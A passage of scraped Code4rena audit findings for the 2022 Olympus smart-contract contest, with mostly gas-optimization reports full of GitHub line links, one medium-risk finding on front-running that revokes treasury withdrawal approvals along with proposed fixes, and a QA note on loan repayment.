https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33   9.- Present variables with default values are not required https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) [Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)   10.- Multiply/divide by two should use bit shift https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L419 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L420 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427   11.- When you have a function parameter where you just need to read the data use calldate instead of memory. Can save gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L205 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L152 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L45   12.- Use a more recent version of solidity https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/MINTR.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/INSTR.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/VoterRegistration.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/interfaces/IBondCallback.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IHeart.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L2 "}, {"title": "Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67   # Vulnerability details  ## Impact Any withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.  ## Proof of Concept The function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of \"revoking a deactivated policy's approvals\". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.   ## Tools Used  IDE (Remix, VSCode)  ## Recommended Mitigation Steps  A partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:  As a public variable in Kernel.sol `mapping(address => bool) public isRegisteredPolicy;`  in Kernel.activatePolicy(): `isRegisteredPolicy[address(policy_)] ) = true;`  and finally in TreasuryCustodian.revokePolicyApprovals(): `if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/312", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "[1] ``<ARRAY>.LENGTH`` SHOULD NOT BE LOOKED UP IN EVERY LOOP OF A`` FOR``-LOOP  The overheads outlined below are *PER LOOP*, excluding the first loop  -storage arrays incur a Gwarmaccess (100 gas) -memory arrays use MLOAD (3 gas) -calldata arrays use CALLDATALOAD (3 gas) Caching the length changes each of these to a DUP<N> (3 gas), and gets rid of the extra DUP<N> needed to store the stack offset.   *There are 5 instances of this issue:*  ``` File : 2022-08-olympus/src/Kernel.sol  306: for (uint256 i; i < depLength; ) {  413: for (uint256 i; i < depcLength; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L306)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L413)  ``` File :2022-08-olympus/src/policies/TreasuryCustodian.sol  59:   for (uint256 j; j < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/TreasuryCustodian.sol#L59)  ``` File: 2022-08-olympus/src/policies/BondCallback.sol  156:   for (uint256 i; i < len; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/BondCallback.sol#L156)  ```  File: 2022-08-olympus/src/policies/Governance.sol  278:  for (uint256 step; step < instructions.length; ) {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L278)  [2] USING  ``PRIVATE`` RATHER THAN ``PUBLIC`` FOR CONSTANTS, SAVES GAS  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  *There are 9 instances of this issue:*  ``` File: 2022-08-olympus/src/modules/RANGE.sol  65:  uint256 public constant FACTOR_SCALE = 1e4;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65)  ``` File: 2022-08-olympus/src/modules/PRICE.sol  59: uint8 public constant decimals = 18;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  ``` File:2022-08-olympus/src/policies/Operator.sol  89:  uint32 public constant FACTOR_SCALE = 1e4;  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89)  ``` File: 2022-08-olympus/src/policies/Governance.sol  121:  uint256 public constant SUBMISSION_REQUIREMENT = 100;  124:   uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  127:   uint256 public constant GRACE_PERIOD = 1 weeks;  130:    uint256 public constant ENDORSEMENT_THRESHOLD = 20;  133:   uint256 public constant EXECUTION_THRESHOLD = 33;  137:    uint256 public constant EXECUTION_TIMELOCK = 3 days;  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137)    [3]  ``PUBLIC`` FUNCTIONS NOT CALLED BY THE CONTRACT SHOULD BE DECLARED ``EXTERNAL`` INSTEAD  Contracts [are allowed](https://docs.soliditylang.org/en/latest/contracts.html#function-overriding) to override their parents\u2019 functions and change the visibility from ``external`` to ``public`` and can save gas by doing so.  *There are 5 instances of this issue:*  ``` File: 2022-08-olympus/src/Kernel.sol  439:  function grantRole(Role role_, address addr_) public onlyAdmin {  451:   function revokeRole(Role role_, address addr_) public onlyAdmin {  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L439)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L451)  ``` File: 2022-08-olympus/src/modules/TRSRY.sol  75:  function withdrawReserves( 76:        address to_, 77:        ERC20 token_, 78:        uint256 amount_ 79:    ) public {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L75-L79)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  37:  function burnOhm(address from_, uint256 amount_) public permissioned {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L37)  ``` File: 2022-08-olympus/src/modules/INSTR.sol  37: function getInstructions(uint256 instructionsId_) public view returns (Instruction[] memory) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L37)   [4] DON\u2019T COMPARE BOOLEAN EXPRESSIONS TO BOOLEAN LITERALS   ``if (<x> == true)`` => ``if(<x>)`` , ``if (<x> == false)`` => ``if (!<x>)``  *There are 2 instances of this issue:*  ```  File: 2022-08-olympus/src/policies/Governance.sol  223:   if (proposalHasBeenActivated[proposalId_] == true) {  306:     if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L223)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L306)   [5] USAGE OF ``UINTS/INTS`` SMALLER THAN 32 BYTES (256 BITS) INCURS OVERHEAD  When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size  [https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html](https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html) Use a larger size then downcast where needed  *There are 92 instances of this issue*  ```  File: 2022-08-olympus/src/Kernel.sol  100:  function VERSION() external pure virtual returns (uint8 major, uint8 minor) {}   #1  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100](https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L100)  ``` File: 2022-08-olympus/src/modules/MINTR.sol  25: function VERSION() external pure override returns (uint8 major, uint8 minor) {      #2  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/MINTR.sol#L25)   ```  File: 2022-08-olympus/src/modules/TRSRY.sol  51:  function VERSION() external pure override returns (uint8 major, uint8 minor) {     #3  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L51)  ```  File: 2022-08-olympus/src/modules/RANGE.sol  45:  uint48 lastActive;           #4  85:  lastActive: uint48(block.timestamp),       #5  92:  lastActive: uint48(block.timestamp),       #6  136:  _range.high.lastActive = uint48(block.timestamp);        #7  148:  _range.low.lastActive = uint48(block.timestamp);        #8  191:  lastActive: uint48(block.timestamp),                    #9  200:   lastActive: uint48(block.timestamp),                   #10  115:  function VERSION() external pure override returns (uint8 major, uint8 minor) {      #11  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L45)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L85)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L92)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L136)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L148)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L191)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L200)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L115)  ```  File: 2022-08-olympus/src/modules/PRICE.sol  44:   uint32 public nextObsIndex;              #12  47:   uint32 public numObservations;              #13  97:    numObservations = uint32(movingAverageDuration_ / observationFrequency_);        #14  127:   uint32 numObs = numObservations;                       #15  185:   uint32 lastIndex = nextObsIndex == 0 ? numObservations - 1 : nextObsIndex - 1;       #16  257:  numObservations = uint32(newObservations);                  #17  289:   numObservations = uint32(newObservations);                 #18  50:    uint48 public observationFrequency;                    #19  53:    uint48 public movingAverageDuration;                  #20  56:    uint48 public lastObservationTime;                    #21  75:     uint48 observationFrequency_,                         #22  76:      uint48 movingAverageDuration_                         #23  143:      lastObservationTime = uint48(block.timestamp);        #24  205:     function initialize(uint256[] memory startObservations_, uint48 lastObservationTime_)      #25  215:       if (startObservations_.length != numObs || lastObservationTime_ > uint48(block.timestamp))     #26       240:      function changeMovingAverageDuration(uint48 movingAverageDuration_) external permissioned {     #27  266:      function changeObservationFrequency(uint48 observationFrequency_) external permissioned {       #28  59:        uint8 public constant decimals = 18;                     #29  84:        uint8 ohmEthDecimals = _ohmEthPriceFeed.decimals();        #30  87:        uint8 reserveEthDecimals = _reserveEthPriceFeed.decimals();         #31  113:       function VERSION() external pure override returns (uint8 major, uint8 minor) {        #32  ``` [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L44)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L47)   [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L97)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L127)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L185)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L257)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L289)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L50)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L53)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L56)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L75-L76)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L143)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L205)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L215)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L240)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L266)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L84)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L87)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L113)   ```  File: 2022-08-olympus/src/modules/VOTES.sol  27: function VERSION() external pure override returns (uint8 major, uint8 minor) {       #33  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/VOTES.sol#L27)    ```  File: 2022-08-olympus/src/modules/INSTR.sol  28:  function VERSION() public pure override returns (uint8 major, uint8 minor) {        #34  ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/INSTR.sol#L28)     ```  File: 2022-08-olympus/src/policies/Operator.sol   83:  uint8 public immutable ohmDecimals;                #35  86:  uint8 public immutable reserveDecimals;.             #36  375:  uint256 oracleScale = 10**uint8(int8(PRICE.decimals()) - priceDecimals);           #37  377:   uint8(                                                                              #38 378:   36 + scaleAdjustment + int8(reserveDecimals) - int8(ohmDecimals) - priceDecimals 379:   );  418:    uint8 oracleDecimals = PRICE.decimals();                     #39  430:     uint256 oracleScale = 10**uint8(int8(oracleDecimals) - priceDecimals);          #40  432:      uint8(                                                                          #41 433:      36 + scaleAdjustment + int8(ohmDecimals) - int8(reserveDecimals) - priceDecimals 434:      );  128:      lastRegen: uint48(block.timestamp),             #42  210:      uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&       #43           216:      uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) &&        #44  403:       vesting: uint48(0), // Instant swaps                            #45  404:        conclusion: uint48(block.timestamp + config_.cushionDuration),       #46  708:         _status.high.lastRegen = uint48(block.timestamp);                 #47  720:        _status.low.lastRegen = uint48(block.timestamp);                  #48  89:         uint32 public constant FACTOR_SCALE = 1e4;                           #49  97:          uint32[8] memory configParams                     #50  106:          if (configParams[2] < uint32(10_000)) revert Operator_InvalidParams();          #51  108:           if (configParams[3] < uint32(1 hours) || configParams[3] > configParams[1])     #52  116:             configParams[7] == uint32(0)                  #53  127:            count: uint32(0),                           #54  129:             nextObservation: uint32(0),                  #55  516:          function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {       #56  528:           uint32 duration_,                #57 529:        uint32 debtBuffer_,                   #58 530:        uint32 depositInterval_              #59  535:        if (debtBuffer_ < uint32(10_000)) revert Operator_InvalidParams();          #60 536:        if (depositInterval_ < uint32(1 hours) || depositInterval_ > duration_)       #61  548:       function setReserveFactor(uint32 reserveFactor_) external onlyRole(\"operator_policy\") {       #62  560:        uint32 wait_,               #63 561:        uint32 threshold_,        #64 562:        uint32 observe_              #65  665:       uint32 observe = _config.regenObserve;          #66  705:        _status.high.count = uint32(0);                   #67  707:         _status.high.nextObservation = uint32(0);         #68  717:       _status.low.count = uint32(0);                    #69  719:       _status.low.nextObservation = uint32(0);              #70   ```  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L83)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L86)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L375)  [https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377-L379](https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L377"}, {"title": "TRSRY.sol function repayLoan() alows only loan owner to repay loan", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/307", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119   # Vulnerability details  ### TRSRY.sol alows only loan owner to repay loan  It should be allowed that that everyone can repay the loan. There could be a situation that loan owner is not able to repay the loan but a different address could repay in his place. It seems as unnecessary restriction that only the owner can repay his loan.  **Recommendation**: Allow everyone to repay any loan. Context: [`TRSRY.sol#L104-L119`](https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L104-L119) ```diff= -    function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant { -        if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();          // Deposit from caller first (to handle nonstandard token transfers)         uint256 prevBalance = token_.balanceOf(address(this));         token_.safeTransferFrom(msg.sender, address(this), amount_);          uint256 received = token_.balanceOf(address(this)) - prevBalance;          // Subtract debt from caller -        reserveDebt[token_][msg.sender] -= received;         totalDebt[token_] -= received;  -        emit DebtRepaid(token_, msg.sender, received);     } ```"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-08-olympus-findings/issues/296", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-08-olympus-findings", "body": "## Table of Contents Total of 11 Issues Found. - Storage Variables can be Packed into Fewer 